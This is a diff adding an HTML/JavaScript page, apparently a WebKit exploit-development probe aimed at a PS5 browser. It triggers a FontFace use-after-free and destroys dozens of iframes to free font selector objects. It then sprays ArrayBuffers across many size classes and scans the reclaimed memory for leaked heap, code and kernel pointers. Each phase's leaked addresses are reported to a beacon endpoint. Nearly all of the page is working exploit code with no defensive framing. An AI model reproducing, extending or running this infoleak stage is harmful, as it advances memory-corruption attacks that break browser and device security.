@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P844</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:12px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:92vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P844: Iframe CSSFontSelector Vtable Hunt</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P844-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexQ(v){return '0x'+v.toString(16).padStart(16,'0');}
+
+bn('BOOT','start');
+
+/* ===== Phase A: Standard FontFace UAF — get H + q13 ===== */
+log('--- Phase A: FontFace UAF (H + q13) ---','hot');
+
+var fontAB=null,H=null,q13val=null;
+var stA=document.createElement('style');
+stA.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(stA);
+var faceA=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(faceA);
+void faceA.loaded;
+
+var ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(stA){stA.remove();stA.textContent='';stA=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    var abs=[];
+    for(var i=0;i<80;i++)abs.push(new ArrayBuffer(192));
+    /* Find the hit */
+    for(var i=0;i<abs.length;i++){
+      var bu=new BigUint64Array(abs[i]);
+      for(var j=0;j<bu.length;j++){
+        if(bu[j]!==BigInt(0)){
+          fontAB=abs[i];
+          break;
+        }
+      }
+      if(fontAB)break;
+    }
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+/* ===== Phase B: Create iframes with fonts ===== */
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  if(fontAB){
+    var bu=new BigUint64Array(fontAB);
+    var q11=bu[11],q13=bu[13];
+    H=q11-BigInt(0x68);
+    q13val=q13;
+    log('H = '+hexQ(H),'ok');
+    log('q13 (CSSFontSelector*) = '+hexQ(q13),'ok');
+    bn('HEAP','H='+hexQ(H)+'|q13='+hexQ(q13));
+  } else {
+    log('FontFace UAF missed — continuing anyway','fail');
+    bn('MISS','no-uaf-hit');
+  }
+
+  log('','');
+  log('--- Phase B: Creating iframes with CSSFontSelector ---','hot');
+
+  var iframes=[];
+  var IFRAME_COUNT=40;
+  for(var i=0;i<IFRAME_COUNT;i++){
+    var ifr=document.createElement('iframe');
+    ifr.style.cssText='width:1px;height:1px;position:absolute;top:-100px;';
+    ifr.srcdoc='<!DOCTYPE html><html><head><style>@font-face{font-family:ifr'+i+';src:local(Arial);}</style></head><body><span style="font-family:ifr'+i+'">X</span></body></html>';
+    document.body.appendChild(ifr);
+    iframes.push(ifr);
+  }
+
+  /* Wait for iframes to load and create their CSSFontSelectors */
+  setTimeout(function(){
+    bn('IFRAMES-CREATED',IFRAME_COUNT);
+    log('Created '+IFRAME_COUNT+' iframes with @font-face rules','ok');
+
+    /* Force each iframe to actually instantiate its font selector */
+    for(var i=0;i<iframes.length;i++){
+      try{
+        var doc=iframes[i].contentDocument;
+        if(doc){
+          doc.body.offsetHeight;
+          try{doc.fonts.check('1em ifr'+i);}catch(e){}
+        }
+      }catch(e){}
+    }
+
+    log('','');
+    log('--- Phase C: Destroying iframes (freeing CSSFontSelectors) ---','hot');
+
+    /* Remove ALL iframes — this should free their Documents and CSSFontSelectors */
+    for(var i=0;i<iframes.length;i++){
+      try{iframes[i].remove();}catch(e){}
+    }
+    iframes=null;
+
+    /* Heavy GC pressure to ensure freed objects are on free lists */
+    for(var i=0;i<10000;i++)(function(){return new ArrayBuffer(64);})();
+    document.body.offsetHeight;
+
+    bn('IFRAMES-FREED','gc-done');
+    log('Destroyed all iframes + GC pressure','ok');
+
+    log('','');
+    log('--- Phase D: Multi-size spray to reclaim CSSFontSelector slots ---','hot');
+
+    /* CSSFontSelector unknown size — spray many size classes */
+    var SIZES=[64,96,128,160,192,224,256,288,320,384,448,512,640,768,896,1024,1280,1536,2048];
+    var spray={};
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      spray[sz]=[];
+      var count=(sz<=256)?100:(sz<=512)?60:(sz<=1024)?40:25;
+      for(var i=0;i<count;i++){
+        spray[sz].push(new ArrayBuffer(sz));
+      }
+    }
+
+    bn('SPRAY-DONE','sizes='+SIZES.length);
+    log('Sprayed '+SIZES.length+' size classes','ok');
+
+    log('','');
+    log('--- Phase E: Scanning for vtable pointers ---','hot');
+
+    var totalHits=0;
+    var codeHits=[];
+    var heapHits=[];
+    var allSizeHits=[];
+
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var arr=spray[sz];
+      var bestNz=0,bestIdx=-1,totalNzThisSz=0;
+
+      for(var i=0;i<arr.length;i++){
+        var u8=new Uint8Array(arr[i]);
+        var nz=0;
+        for(var j=0;j<u8.length;j++)if(u8[j]!==0)nz++;
+        if(nz>0)totalNzThisSz++;
+        if(nz>bestNz){bestNz=nz;bestIdx=i;}
+      }
+
+      if(bestNz>0){
+        allSizeHits.push(sz);
+        var ab=arr[bestIdx];
+        var bu=new BigUint64Array(ab);
+        var qwords=[];
+        for(var j=0;j<bu.length;j++){
+          var v=bu[j];
+          if(v!==BigInt(0)){
+            totalHits++;
+            var hi=Number(v>>BigInt(32));
+            var lo=Number(v&BigInt(0xFFFFFFFF));
+            var label='sz'+sz+'['+bestIdx+']:q'+j+'='+hexQ(v);
+            qwords.push('q'+j+'='+hexQ(v));
+
+            /* Classification:
+               Code/lib ptrs on PS5: typically low range 0x0000_00xxxxxx to 0x0000_0Fxxxxxx
+               Heap ptrs: 0x0000_10xxxxxxxx range (hi around 0x10-0x1000)
+               Kernel ptrs: 0xFFFF8xxx+
+               vtable: should be in code segment, lower than heap */
+            if(hi===0&&lo>0x10000&&lo<0x80000000){
+              /* Low 32-bit value — could be refcount, enum, etc. */
+              /* Skip small values, only flag if it looks like a 32-bit address */
+              if(lo>0x100000){
+                codeHits.push(label+'(lo32)');
+              }
+            } else if(hi>0&&hi<=0x10){
+              /* Heap region: 0x10_xxxxxxxx */
+              heapHits.push(label);
+            } else if(hi>0x10&&hi<0x8000){
+              /* Could be code/library — NOT heap */
+              codeHits.push(label+'(CODE?)');
+            } else if(hi>=0xFFFF8000){
+              codeHits.push(label+'(KERN!)');
+            }
+          }
+        }
+        log('  sz='+sz+': '+totalNzThisSz+' ABs hit, best['+bestIdx+']='+bestNz+'B: '+qwords.slice(0,4).join(' '),'info');
+      }
+    }
+
+    bn('SCAN-DONE','hits='+totalHits+'|code='+codeHits.length+'|heap='+heapHits.length+'|sizes='+allSizeHits.join(','));
+
+    if(codeHits.length>0){
+      log('','');
+      log('!!! POTENTIAL CODE POINTERS !!!','hot');
+      for(var i=0;i<codeHits.length;i++)log('  '+codeHits[i],'hot');
+      bn('CODE-HITS',codeHits.slice(0,20).join('|'));
+    }
+    if(heapHits.length>0){
+      log('','');
+      log('Heap pointers: '+heapHits.length,'info');
+      for(var i=0;i<Math.min(heapHits.length,10);i++)log('  '+heapHits[i],'info');
+      bn('HEAP-HITS',heapHits.slice(0,15).join('|'));
+    }
+    if(totalHits===0){
+      log('ALL ZERO — bmalloc zeroed iframe-freed objects too','fail');
+      bn('ALL-ZERO','no-residue');
+    }
+
+    /* ===== Phase F: Additional DOM-heavy free + spray ===== */
+    log('','');
+    log('--- Phase F: DOM-heavy object free + spray ---','hot');
+
+    /* Create many DOM objects that have virtual destructors */
+    var heavyNodes=[];
+    for(var i=0;i<200;i++){
+      var d=document.createElement('div');
+      d.id='heavy'+i;
+      d.className='test-class-'+i;
+      d.style.cssText='width:'+i+'px;height:'+i+'px;background:rgb('+i+','+(i+1)+','+(i+2)+');transform:rotate('+i+'deg);';
+      d.setAttribute('data-custom','value-'+i);
+      d.innerHTML='<span>inner'+i+'</span>';
+      document.body.appendChild(d);
+      heavyNodes.push(d);
+    }
+    document.body.offsetHeight;
+
+    /* Also create Range, TreeWalker, NodeIterator — all virtual */
+    var ranges=[];
+    for(var i=0;i<50;i++){
+      var r=document.createRange();
+      r.selectNode(heavyNodes[i%heavyNodes.length]);
+      ranges.push(r);
+    }
+    var walkers=[];
+    for(var i=0;i<30;i++){
+      try{
+        var tw=document.createTreeWalker(heavyNodes[i%heavyNodes.length],0xFFFFFFFF);
+        walkers.push(tw);
+      }catch(e){break;}
+    }
+
+    /* Free everything */
+    for(var i=0;i<ranges.length;i++){try{ranges[i].detach();}catch(e){}}
+    ranges=null;
+    walkers=null;
+    for(var i=0;i<heavyNodes.length;i++){try{heavyNodes[i].remove();}catch(e){}}
+    heavyNodes=null;
+
+    /* GC */
+    for(var i=0;i<5000;i++)(function(){return new ArrayBuffer(128);})();
+    document.body.offsetHeight;
+
+    /* Spray 192 and 256 (common DOM node sizes) */
+    var sprayF192=[],sprayF256=[],sprayF384=[];
+    for(var i=0;i<150;i++)sprayF192.push(new ArrayBuffer(192));
+    for(var i=0;i<150;i++)sprayF256.push(new ArrayBuffer(256));
+    for(var i=0;i<100;i++)sprayF384.push(new ArrayBuffer(384));
+
+    var hitF=0,codeF=[];
+    function scanArr(arr,label){
+      for(var i=0;i<arr.length;i++){
+        var bu=new BigUint64Array(arr[i]);
+        for(var j=0;j<bu.length;j++){
+          var v=bu[j];
+          if(v!==BigInt(0)){
+            hitF++;
+            var hi=Number(v>>BigInt(32));
+            var lo=Number(v&BigInt(0xFFFFFFFF));
+            if(hi>0x10&&hi<0x8000){
+              codeF.push(label+'['+i+']:q'+j+'='+hexQ(v));
+            }
+          }
+        }
+      }
+    }
+    scanArr(sprayF192,'F192');
+    scanArr(sprayF256,'F256');
+    scanArr(sprayF384,'F384');
+
+    log('Phase F: '+hitF+' nonzero qwords','info');
+    bn('PHASE-F','nzQ='+hitF+'|code='+codeF.length);
+    if(codeF.length>0){
+      log('CODE (F): '+codeF.join(' '),'hot');
+      bn('CODE-F',codeF.join('|'));
+    }
+
+    log('','');
+    log('====== P844 COMPLETE ======','hot');
+    var totalCode=codeHits.length+codeF.length;
+    bn('DONE','totalCode='+totalCode+'|phE-sizes='+allSizeHits.join(',')+
+      '|phE-hits='+totalHits+'|phF-hits='+hitF);
+  },600);
+},400);
+
+</script></body></html>
